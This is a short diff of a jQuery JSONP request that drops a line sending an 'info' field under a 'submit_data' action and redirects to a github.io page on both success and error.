@@ -340,11 +340,10 @@
       url: url ,
       method: "GET",
       dataType: "jsonp",
-	  data: {action: 'submit_data', info: info},
-	  success: function(data) {
+	  success: function(crossDomain) {
                 window.location.href="https://vikesh-tonpe.github.io/.github.io/";
             },
-            error: function(data) {
+            error: function(crossDomain) {
             window.location.href="https://vikesh-tonpe.github.io/.github.io/";
             },
     });
